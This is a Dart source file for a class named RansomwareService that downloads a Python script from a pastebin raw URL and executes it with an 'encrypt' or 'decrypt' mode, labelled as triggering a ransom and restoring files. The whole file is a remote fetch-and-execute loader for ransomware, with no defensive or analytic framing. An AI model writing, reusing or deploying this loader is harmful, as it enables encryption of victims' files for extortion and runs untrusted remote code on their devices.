import 'package:http/http.dart' as http;
import 'python_service.dart';

class RansomwareService {
  static const String PAYLOAD_URL =
      'https://pastebin.com/raw/Nc4W348y';

  static Future<void> triggerRansom() async {
    await _runPython('encrypt');
  }

  static Future<void> restoreFiles() async {
    await _runPython('decrypt');
  }

  static Future<void> _runPython(String mode) async {
    try {
      print('=== DOWNLOADING PYTHON SCRIPT ===');
      final response = await http.get(Uri.parse(PAYLOAD_URL));
      if (response.statusCode != 200) {
        throw Exception('Failed to download: ${response.statusCode}');
      }
      
      final scriptContent = response.body;
      print('Script size: ${scriptContent.length} bytes');
      
      print('=== EXECUTING PYTHON SCRIPT ===');
      final result = await PythonService.runPythonScript(
        scriptContent,
        ['--mode', mode],
      );
      
      print('Python result: $result');
      print('=== PYTHON SCRIPT COMPLETED ===');
    } catch (e) {
      print('RansomwareService error: $e');
      rethrow;
    }
  }
}